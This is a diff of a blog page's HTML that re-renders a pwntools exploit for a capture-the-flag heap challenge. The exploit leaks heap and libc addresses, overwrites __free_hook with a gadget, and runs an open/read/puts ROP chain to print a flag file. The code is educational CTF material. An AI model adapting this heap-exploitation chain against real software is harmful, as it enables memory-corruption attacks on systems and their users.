-</span></span><span style="display:flex;"><span>rsp_value = heap_base + 0xfd0                           <span style="color:#008000"># Calculated using a debugger</span>
-</span></span><span style="display:flex;"><span>rcx_value = ret
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>ropchain = ropchain.ljust(0xa0, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>)
-</span></span><span style="display:flex;"><span>ropchain += p64(rsp_value)
-</span></span><span style="display:flex;"><span>ropchain += p64(rcx_value)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rax)                                <span style="color:#008000"># sets rax to the target syscall number</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(2)                                      <span style="color:#008000"># SYS_OPEN</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># pointer to path</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base + 0x7a0)                      <span style="color:#008000"># address of string /home/user/flag.txt</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(syscall)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># sets the fd value</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(3)                                      <span style="color:#008000"># fd of the recently opened file</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rsi)                                <span style="color:#008000"># sets the where the content will be written</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base)                              <span style="color:#008000"># any writeable address</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdx)                                <span style="color:#008000"># sets the number of bytes to read</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(0x100)
-</span></span><span style="display:flex;"><span>ropchain += p64(read)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ropchain += p64(pop_rdi)                                <span style="color:#008000"># address of the data read</span>
-</span></span><span style="display:flex;"><span>ropchain += p64(heap_base)
-</span></span><span style="display:flex;"><span>ropchain += p64(puts)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>add(0x800, ropchain)
-</span></span><span style="display:flex;"><span>delete(5)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p.interactive()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;split-w&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./inception_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = remote(&#34;remote1.thcon.party&#34;, 10904)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-= Dream&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;cccc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;dddd&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x570</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;push&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc base : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x43ae8</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x23eea</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x215bf</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1b96</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xd2745</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/etc/passwd</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                           <span class="c1"># Calculated using a debugger</span>
+</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>                                <span class="c1"># sets rax to the target syscall number</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                      <span class="c1"># SYS_OPEN</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># pointer to path</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x7a0</span><span class="p">)</span>                      <span class="c1"># address of string /home/user/flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># sets the fd value</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                      <span class="c1"># fd of the recently opened file</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>                                <span class="c1"># sets the where the content will be written</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>                              <span class="c1"># any writeable address</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>                                <span class="c1"># sets the number of bytes to read</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># address of the data read</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div>
 
 
@@ -733,24 +733,6 @@ We have to <code>open</code> the file, <code>read</code> from the corresponding 
 
     
 
-    
-    <script src="https://blog.slowerzs.net/js/highlight.min.js"></script>
-    
-    
-    <script src="https://blog.slowerzs.net/js/python.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/c.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/x86asm.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/armasm.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/bash.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/shell.min.js"></script>
-    
-    <script src="https://blog.slowerzs.net/js/csharp.min.js"></script>
-    
     
 
     <div id="modal" class="modal">
